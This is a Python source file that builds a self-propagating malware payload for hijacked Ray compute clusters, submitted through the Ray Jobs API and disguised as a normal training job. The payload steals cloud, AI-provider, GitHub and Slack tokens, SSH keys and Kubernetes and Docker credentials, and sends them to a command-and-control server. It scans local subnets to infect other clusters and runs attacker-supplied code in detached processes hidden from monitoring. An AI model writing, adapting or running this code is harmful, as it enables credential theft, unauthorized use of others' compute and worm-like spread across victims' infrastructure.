# -*- coding: utf-8 -*-
"""
Payload that executes INSIDE the hijacked Ray cluster (head node, via Jobs API).
Template placeholders (%%KEY%%) are substituted at enroll time, then base64-encoded.
Runs as a normal Ray job — indistinguishable from a legitimate training workload.
"""

PAYLOAD_TEMPLATE = r'''
import base64, json, math, os, platform, random, re, subprocess, sys, tempfile, time
import urllib.request, urllib.error, socket, struct, shutil

C2_URL = "%%C2_URL%%"
BEARER = "%%BEARER%%"
TAG = "%%TAG%%"
HARVEST = %%HARVEST%%
PROPAGATE = %%PROPAGATE%%
MAX_CYCLES = %%MAX_CYCLES%%

HOME = os.path.expanduser("~")
LOOT_DIR = os.path.join(tempfile.gettempdir(), ".cache", "system")

def _hdr():
    return {"Content-Type": "application/json", "Authorization": "Bearer " + BEARER,
            "ngrok-skip-browser-warning": "true"}

def post(path, obj, timeout=15):
    data = json.dumps(obj).encode()
    req = urllib.request.Request(C2_URL.rstrip("/") + path, data=data, headers=_hdr(), method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode()

def get(path, timeout=15):
    req = urllib.request.Request(C2_URL.rstrip("/") + path, headers=_hdr())
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode()

def sh(cmd, timeout=20):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout).stdout.strip()
    except Exception:
        return ""

TOKEN_PATTERNS = {
    "AWS_ACCESS_KEY_ID": re.compile(r"(AKIA[0-9A-Z]{16})"),
    "GITHUB_PAT": re.compile(r"(ghp_[A-Za-z0-9]{36})|(github_pat_[A-Za-z0-9_]{22,})"),
    "OPENAI_KEY": re.compile(r"(sk-[A-Za-z0-9_\-]{20,})"),
    "ANTHROPIC_KEY": re.compile(r"(sk-ant-[A-Za-z0-9_\-]{20,})"),
    "SLACK_TOKEN": re.compile(r"(xox[baprs]-[A-Za-z0-9\-]{10,})"),
    "GOOGLE_OAUTH": re.compile(r"(ya29\.[A-Za-z0-9_\-]{20,})"),
}

def harvest():
    loot = {"env_tokens": {}, "files": {}}
    for k, v in sorted(os.environ.items()):
        for name, rx in TOKEN_PATTERNS.items():
            m = rx.search(v or "")
            if m:
                tok = m.group(0)
                try:
                    import hashlib
                    loot["env_tokens"][k] = {"value": tok, "sha1": hashlib.sha1(tok.encode()).hexdigest()}
                except Exception:
                    loot["env_tokens"][k] = {"value": tok}
    cand = [
        ("aws_credentials", os.path.join(HOME, ".aws", "credentials")),
        ("aws_config", os.path.join(HOME, ".aws", "config")),
        ("gcloud_creds", os.path.join(HOME, ".config", "gcloud", "credentials.db")),
        ("gcloud_legacy", os.path.join(HOME, ".config", "gcloud", "legacy_credentials")),
        ("kube_token", "/var/run/secrets/kubernetes.io/serviceaccount/token"),
        ("docker_cfg", os.path.join(HOME, ".docker", "config.json")),
        ("ssh_keys", os.path.join(HOME, ".ssh")),
    ]
    for name, p in cand:
        try:
            if os.path.isfile(p) and os.path.getsize(p) < 200_000:
                with open(p, "rb") as f:
                    loot["files"][name] = base64.b64encode(f.read()).decode()
            elif os.path.isdir(p):
                for fn in sorted(os.listdir(p))[:40]:
                    fp = os.path.join(p, fn)
                    if os.path.isfile(fp) and os.path.getsize(fp) < 100_000:
                        with open(fp, "rb") as f:
                            loot["files"][name + "/" + fn] = base64.b64encode(f.read()).decode()
        except Exception:
            pass
    return loot

def gpu_info():
    info = {}
    r = sh("nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader")
    info["nvidia_smi"] = r if r else "none"
    info["visible_cuda_devices"] = os.environ.get("CUDA_VISIBLE_DEVICES", "")
    try:
        import ray
        ray.init(address="auto", ignore_reinit_error=True, logging_level="ERROR")
        res = ray.cluster_resources()
        info["cluster"] = {k: v for k, v in res.items()
                           if k in ("CPU", "GPU", "memory", "object_store_memory")
                           or k.startswith("node:")}
        info["nodes"] = ray.nodes().__len__()
        info["alive_nodes"] = sum(1 for n in ray.nodes() if n.get("Alive"))
    except Exception as e:
        info["ray_error"] = repr(e)
    return info

def local_ips():
    ips = set()
    try:
        for fam, _, _, _, sa in socket.getaddrinfo(socket.gethostname(), None):
            if fam == socket.AF_INET:
                ips.add(sa[0])
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ips.add(s.getsockname()[0]); s.close()
    except Exception:
        pass
    return sorted(i for i in ips if not i.startswith("127."))

def ip_to_net24(ip):
    a, b, c, _ = ip.split(".")
    return f"{a}.{b}.{c}.0/24"

def propagate():
    """ShadowRay 2.0 vector: enroll other Ray clusters visible from this one."""
    targets = set()
    for ip in local_ips():
        targets.add(ip_to_net24(ip))
    base = "127.0.0.1"
    for net in targets:
        prefix = net.rsplit(".", 1)[0]
        for host in range(1, 255):
            targets.discard(net)
            candidate = f"{prefix}.{host}"
            if candidate in local_ips():
                continue
            try:
                if port_open(candidate, 8265, timeout=0.6):
                    enroll_node(candidate, 8265)
            except Exception:
                pass

_PORT_CACHE = {}
def port_open(ip, port, timeout=1.0):
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False

def enroll_node(ip, port):
    """Submit THIS payload (propagate off) to another cluster via its Jobs API."""
    try:
        import urllib.request
        payload = PAYLOAD_B64.decode()
        entry = "import base64;exec(base64.b64decode('%s').decode())" % payload
        body = json.dumps({"entrypoint": "python -c \"%s\"" % entry.replace('"', '\\"'),
                           "submission_id": "team-run-" + str(random.randint(10000, 99999))}).encode()
        req = urllib.request.Request(
            f"http://{ip}:{port}/api/jobs/", data=body,
            headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

PAYLOAD_B64 = %%PAYLOAD_B64%%  # self-copy for propagation (build-time injected)

def run_work(spec):
    """Execute assigned work: detached subprocess; output returned."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    path = os.path.join(LOOT_DIR, "run_%d.py" % int(time.time()))
    with open(path, "w") as f:
        f.write(spec.get("code", "print('work')"))
    out_path = path + ".out"
    proc = subprocess.Popen(
        ["python", path], stdout=open(out_path, "w"), stderr=subprocess.STDOUT,
        start_new_session=True)  # detach: survives job completion, hides from Ray monitor (ShadowRay 2.0)
    timeout = spec.get("timeout", 3600)
    t0 = time.time()
    while proc.poll() is None and (time.time() - t0) < timeout:
        time.sleep(5)
    try:
        with open(out_path) as f:
            output = f.read()[-40000:]
    except Exception:
        output = ""
    return {"exit_code": proc.poll(), "output": output}

def main():
    ident = {"host": platform.node(), "user": os.environ.get("USER") or os.environ.get("USERNAME", "?"),
             "tag": TAG, "ips": local_ips(), "cwd": os.getcwd(),
             "python": sys.version.split()[0], "time": time.time(),
             "cluster_id": os.environ.get("RAY_ADDRESS", "") or "auto"}
    sysinfo = {"os": platform.platform(), "cwd": os.getcwd(),
               "cpu_count": os.cpu_count(),
               "disk_free_gb": round(shutil_disk_free(), 2),
               "whoami": sh("whoami"), "docker": sh("docker ps --format '{{.Names}}' 2>/dev/null | head -5"),
               "kernel": sh("uname -a")}
    gpus = gpu_info()
    beacon = dict(ident); beacon.update(gpus); beacon.update(sysinfo)
    beacon["beacon_type"] = "enroll"

    if HARVEST:
        try:
            beacon["loot"] = harvest()
        except Exception as e:
            beacon["loot_error"] = repr(e)

    try:
        resp = post("/beacon", beacon)
    except Exception as e:
        print("VENOM-MARKER: c2-unreachable", repr(e))
        print("VENOM-MARKER: gpu-info", json.dumps(gpus)[:2000])

    if PROPAGATE:
        try:
            propagate()
        except Exception:
            pass

    for cycle in range(MAX_CYCLES):
        try:
            raw = get("/work?cluster=" + platform.node())
            spec = json.loads(raw) if raw else None
        except Exception:
            spec = None
        if spec and spec.get("code"):
            try:
                result = run_work(spec)
                result = dict(ident); result.update({"beacon_type": "work_result",
                                                      "work_id": spec.get("id", "run"), **result})
                post("/result", result)
            except Exception as e:
                try:
                    post("/result", {"beacon_type": "work_error", "error": repr(e), **ident})
                except Exception:
                    pass
        time.sleep(random.randint(45, 90) + random.random() * 30)  # natural jitter (Section 5.2)
    return 0

def shutil_disk_free():
    try:
        return shutil.disk_usage(os.getcwd()).free / 1e9
    except Exception:
        return -1

if __name__ == "__main__":
    sys.exit(main())
'''


def build_payload(c2_url: str, bearer: str, tag: str,
                 harvest: bool, propagate: bool, max_cycles: int) -> str:
    """Build final python payload source with placeholders substituted."""
    src = PAYLOAD_TEMPLATE
    src = src.replace("%%C2_URL%%", c2_url)
    src = src.replace("%%BEARER%%", bearer)
    src = src.replace("%%TAG%%", tag)
    src = src.replace("%%HARVEST%%", "True" if harvest else "False")
    src = src.replace("%%PROPAGATE%%", "True" if propagate else "False")
    src = src.replace("%%MAX_CYCLES%%", str(max_cycles))
    # self-copy: embed own base64 for propagation target enrollment (propagate inside children off)
    import base64
    own = src.replace("%%PAYLOAD_B64%%", "PLACEHOLDER_SELF")
    child = src.replace("%%PROPAGATE%%", "False").replace("%%PAYLOAD_B64%%", "''")
    b64child = base64.b64encode(child.encode()).decode()
    final = own.replace("PLACEHOLDER_SELF", repr(b64child.encode()))
    assert "%%" not in final
    return final